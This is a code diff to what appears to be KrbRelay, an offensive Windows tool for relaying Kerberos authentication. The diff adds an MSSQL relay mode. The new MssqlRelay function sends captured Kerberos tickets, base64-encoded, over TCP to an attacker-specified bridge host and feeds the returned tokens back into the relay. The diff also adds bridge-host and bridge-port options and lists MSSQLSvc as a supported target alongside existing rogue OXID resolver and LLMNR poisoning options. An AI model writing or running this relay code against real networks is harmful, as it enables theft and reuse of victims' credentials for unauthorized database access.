@@ -7,10 +7,12 @@ using SMBLibrary.Client;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Http;
 using System.Net.NetworkInformation;
+using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
@@ -166,6 +168,37 @@ namespace KrbRelay
         public static HttpClientHandler handler = new HttpClientHandler();
         public static HttpClient httpClient = new HttpClient();
         public static CookieContainer CookieContainer = new CookieContainer();
+        private static string mssqlBridgeHost = "";
+        private static int mssqlBridgePort = 9801;
+        private static TcpClient mssqlBridge;
+        private static StreamReader mssqlBridgeReader;
+        private static StreamWriter mssqlBridgeWriter;
+
+        private static void MssqlRelay()
+        {
+            if (mssqlBridge == null)
+            {
+                mssqlBridge = new TcpClient(mssqlBridgeHost, mssqlBridgePort);
+                var stream = mssqlBridge.GetStream();
+                stream.ReadTimeout = 15000;
+                stream.WriteTimeout = 15000;
+                mssqlBridgeReader = new StreamReader(stream);
+                mssqlBridgeWriter = new StreamWriter(stream) { AutoFlush = true };
+            }
+
+            mssqlBridgeWriter.WriteLine(Convert.ToBase64String(ticket));
+            string reply = mssqlBridgeReader.ReadLine();
+            Console.WriteLine("[*] MSSQL bridge: {0}", reply == null ? "closed" : reply.Substring(0, Math.Min(reply.Length, 32)));
+            if (reply != null && reply.StartsWith("TOKEN "))
+            {
+                apRep1 = Convert.FromBase64String(reply.Substring(6));
+                Console.WriteLine("[+] SQL returned a Kerberos continuation ({0} bytes)", apRep1.Length);
+            }
+            else
+            {
+                Environment.Exit(0);
+            }
+        }
 
         //hooked function
         [STAThread]
@@ -220,6 +253,10 @@ namespace KrbRelay
             else if (service.ToLower() == "cifs")
             {
                 Smb.Connect();
+            }
+            else if (service.ToLower() == "mssqlsvc")
+            {
+                MssqlRelay();
             }
 
             //overwrite security buffer
@@ -436,6 +473,8 @@ namespace KrbRelay
             Console.WriteLine("-rogue <ip>               OBJREF binding -> <ip>:135 (use socat fwd 135 -> victim:<rogue-port>)");
             Console.WriteLine("-rogue-port <port>        Rogue OXID resolver listen port (default 9999)");
             Console.WriteLine("-skip-check               Skip HNetCfg.FwMgr.IsPortAllowed pre-check (use raw -port)");
+            Console.WriteLine("-bridge-host <host>       MSSQL bridge listener address (required for MSSQLSvc)");
+            Console.WriteLine("-bridge-port <port>       MSSQL bridge listener port (default 9801)");
             Console.WriteLine("-llmnr                    LLMNR poisoning");
         }
 
@@ -851,7 +890,32 @@ namespace KrbRelay
                     case "/SKIP-CHECK":
                         skipPortCheck = true;
                         break;
+
+                    case "-BRIDGE-HOST":
+                    case "/BRIDGE-HOST":
+                        if (entry.index + 1 >= args.Length || args[entry.index + 1].StartsWith("-"))
+                        {
+                            Console.WriteLine("[-] -bridge-host requires an address");
+                            return;
+                        }
+                        mssqlBridgeHost = args[entry.index + 1];
+                        break;
+
+                    case "-BRIDGE-PORT":
+                    case "/BRIDGE-PORT":
+                        if (entry.index + 1 >= args.Length || !int.TryParse(args[entry.index + 1], out mssqlBridgePort) || mssqlBridgePort < 1 || mssqlBridgePort > 65535)
+                        {
+                            Console.WriteLine("[-] -bridge-port requires a TCP port from 1 to 65535");
+                            return;
+                        }
+                        break;
                 }
+            }
+
+            if (!show_help && spn.StartsWith("MSSQLSvc/", StringComparison.OrdinalIgnoreCase) && string.IsNullOrWhiteSpace(mssqlBridgeHost))
+            {
+                Console.WriteLine("[-] -bridge-host is required for MSSQLSvc");
+                return;
             }
 
             if (rogueIp != "")
@@ -885,10 +949,10 @@ namespace KrbRelay
             if (!string.IsNullOrEmpty(spn))
             {
                 service = spn.Split('/').First().ToLower();
-                if (!(new List<string> { "ldap", "cifs", "http" }.Contains(service)))
+                if (!(new List<string> { "ldap", "cifs", "http", "mssqlsvc" }.Contains(service)))
                 {
                     Console.WriteLine("'{0}' service not supported", service);
-                    Console.WriteLine("choose from CIFS, LDAP and HTTP");
+                    Console.WriteLine("choose from CIFS, LDAP, HTTP and MSSQLSvc");
                     return;
                 }
                 string[] d = spn.Split('.').Skip(1).ToArray();
